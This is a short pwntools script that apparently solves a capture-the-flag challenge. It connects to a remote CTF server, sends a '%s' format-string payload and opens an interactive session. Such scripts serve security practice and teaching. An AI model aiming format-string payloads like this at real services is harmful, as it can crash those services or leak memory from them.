from pwn import *
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28223)
io.sendline('%s')
io.interactive()
